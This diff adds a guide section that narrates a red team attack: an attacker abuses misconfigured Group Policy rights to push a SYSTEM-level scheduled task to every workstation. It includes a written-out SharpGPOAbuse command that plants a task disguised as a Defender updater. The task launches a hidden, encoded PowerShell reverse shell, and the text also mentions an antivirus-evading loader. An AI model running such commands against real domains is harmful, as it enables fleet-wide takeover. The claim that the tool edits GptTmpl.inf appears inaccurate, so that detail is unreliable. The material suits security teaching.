@@ -1,0 +1,15 @@
+## 10. Real-World Attack Scenario
+
+During a red team engagement, an attacker compromised the workstation of an IT administrator via a phishing payload. The workstation was heavily monitored, and executing `mimikatz.exe` directly would instantly trigger an EDR alert. The goal was to deploy a malicious Scheduled Task across the entire workstation fleet using Group Policy.
+
+**The Context**
+Using BloodHound, the attacker identified that the compromised IT administrator account (`jsmith`) was a member of the `Helpdesk_Tier2` group. This group had been improperly granted `GenericAll` (Full Control) rights over a crucial Group Policy Object named `Baseline_Workstations_Sec`, which was linked to the root of the `Workstations` OU.
+
+**The Execution**
+1.  **Preparation:** The attacker compiled `SharpGPOAbuse` using a custom C# loader to bypass local AV signatures. They crafted a malicious PowerShell one-liner that would execute a reverse shell connecting back to their C2 server.
+2.  **The Injection:** Using `SharpGPOAbuse`, the attacker targeted the `Baseline_Workstations_Sec` GPO. They instructed the tool to create an immediate Scheduled Task that runs as `NT AUTHORITY\SYSTEM`:
+    ```cmd
+    SharpGPOAbuse.exe --AddComputerTask --TaskName "WinDefenderUpdater" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -enc JABz..." --GPOName "Baseline_Workstations_Sec"
+    ```
+3.  **The Propagation:** `SharpGPOAbuse` successfully updated the `GptTmpl.inf` file within the `SYSVOL` share and incremented the GPC version number in Active Directory.
+4.  **The Outcome:** Over the next 90 to 120 minutes, as thousands of workstations across the enterprise performed their standard background Group Policy refresh (`gpupdate`), they downloaded the modified GPO. Each workstation instantly registered and executed the malicious "WinDefenderUpdater" task, providing the red team with thousands of `SYSTEM` level reverse shells without ever deploying a traditional exploit.
